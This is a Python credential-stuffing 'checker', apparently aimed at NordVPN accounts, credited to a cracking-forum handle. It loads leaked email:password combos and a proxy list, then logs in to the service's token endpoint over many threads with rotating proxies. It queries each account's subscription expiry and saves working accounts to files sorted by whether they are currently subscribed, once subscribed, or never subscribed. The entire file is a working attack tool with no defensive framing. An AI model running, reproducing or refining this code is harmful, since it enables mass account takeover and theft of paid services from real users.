import requests
import threading
import ctypes
import random
import time
import colorama
import os
import base64
from datetime import datetime
from time import mktime
from threading import Thread
from colorama import init, Fore, Back, Style
init()

try:
    combo = open('combos.txt', 'r', encoding='utf-8',
                 errors='ignore').read().splitlines()
    proxies = open('proxies.txt', 'r').read().splitlines()
    proxies = [{'https': 'http://'+proxy} for proxy in proxies]

    total, checked, cpm, hit_ratio, retries = len(combo), 0, 0, 0, 0
    hits = 0
    free = 0
    nosub = 0
    print(f'{Fore.WHITE}[{Fore.YELLOW}THREADS{Fore.WHITE}]:')
    threadc = int(input(''))
    print(f'\n{Fore.WHITE}[0 = NO RETRIES - Only retries if proxy failed]\n[YOU SHOULD USE ATLEAST 1 RETRY BUT YOU DONT HAVE TO]\n{Fore.WHITE}[{Fore.YELLOW}RETRIES{Fore.WHITE}]:')
    retry = int(input('')) + 1

    def cls():
        os.system('cls' if os.name == 'nt' else 'clear')

    def title():
        while True:
            ctypes.windll.kernel32.SetConsoleTitleW(
                f'{total}/{checked} - Sub: {hits} - No Sub: {free} - Never Sub: {nosub} - Hit Ratio: {hit_ratio}% - CPM: {cpm} - Retries: {retries} - made by c.to/Zentred')

    def cpmr():
        global total, checked, cpm, hit_ratio
        global hits
        global free
        global nosub
        while True:
            try:
                a = hits + free + nosub
                if checked >= 1:
                    hit_ratio = float(a / checked) * 100
                hit_ratio = format(hit_ratio, ".3f")
                oldchecked = checked
                time.sleep(3)
                newchecked = checked
                cpm = (newchecked - oldchecked) * 20
            except:
                pass

    def divide(stuff):
        return [stuff[i::threadc] for i in range(threadc)]

    def main(combo):
        global checked, retries
        global hits
        global free
        global nosub
        for line in combo:
            for i in range(retry):
                try:
                    req = requests.Session()
                    email, password = line.split(':', 2)

                    data = {
                        'password': password,
                        'username': email
                    }

                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        "Host": "zwyr157wwiu6eior.com",
                        "Connection": "keep-alive",
                        "Accept": "*/*",
                        "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1",
                        "Accept-Language": "en-us",
                        "Accept-Encoding": "gzip, deflate, br"
                    }

                    r = req.post('https://zwyr157wwiu6eior.com/v1/users/tokens', data=data,
                                 headers=headers, proxies=random.choice(proxies), timeout=3)

                    if 'token' in r.text:
                        token = r.json()['token']
                        encoded_token = base64.b64encode(
                            f'token:{token}'.encode("utf-8"))
                        base64_token = str(encoded_token, "utf-8")

                        headers1 = {
                            'User-Agent': 'NordApp iOS (applestore/5.0.5) iOS/13.3.1',
                            'Authorization': f'Basic {base64_token}'
                        }

                        a = requests.get('https://zwyr157wwiu6eior.com/v1/users/services',
                                         headers=headers1, proxies=random.choice(proxies), timeout=5)

                        if a.text == '[]':
                            with open('neversub.txt', 'a', encoding='utf-8', errors='ignore') as p:
                                p.writelines(line+'\n')
                            nosub += 1

                        elif 'expires_at' in a.text:
                            b = a.json()[1]['expires_at'].split(' ')[0]
                            expiredate = b.split('-')
                            datetimenow = str(datetime.now()).split(' ')[0]
                            datetimenow = datetimenow.split('-')
                            expiredate_year, expiredate_month, expiredate_day = expiredate[
                                0], expiredate[1], expiredate[2]
                            datetime_year, datetime_month, datetime_day = datetimenow[
                                0], datetimenow[1], datetimenow[2]

                            if int(expiredate_year) > int(datetime_year):
                                with open('sub.txt', 'a', encoding='utf-8', errors='ignore') as p:
                                    p.writelines(
                                        line+' - '+f'ExpireDate: {b}'+'\n')
                                hits += 1

                            elif int(expiredate_year) == int(datetime_year) and int(expiredate_month) > int(datetime_month):
                                with open('sub.txt', 'a', encoding='utf-8', errors='ignore') as p:
                                    p.writelines(
                                        line+' - '+f'ExpireDate: {b}'+'\n')
                                hits += 1

                            elif int(expiredate_year) == int(datetime_year) and int(expiredate_month) == int(datetime_month) and int(expiredate_day) > int(datetime_day):
                                with open('sub.txt', 'a', encoding='utf-8', errors='ignore') as p:
                                    p.writelines(
                                        line+' - '+f'ExpireDate: {b}'+'\n')
                                hits += 1

                            else:
                                with open('nosub.txt', 'a', encoding='utf-8', errors='ignore') as p:
                                    p.writelines(line+'\n')
                                free += 1

                except:
                    retries += 1
                    continue

                else:
                    checked += 1
                    break

    cls()
    threading.Thread(target=cpmr).start()
    threading.Thread(target=title).start()

    print(f'{Fore.YELLOW}nosub = currently doesnt have a subscription')
    print(f'{Fore.YELLOW}neversub = never had a subscription before')
    print(f'{Fore.YELLOW}sub = is currently subscribed')
    print(f'{Fore.YELLOW}hit ratio = includes sub, neversub and nosub')

    Thread(target=title).start()
    threads = []
    for i in range(threadc):
        threads.append(Thread(target=main, args=[divide(combo)[i]]))
        threads[i].start()
    for thread in threads:
        thread.join()
except Exception as z:
    print(z)
    input('\nPress Enter to exit.')
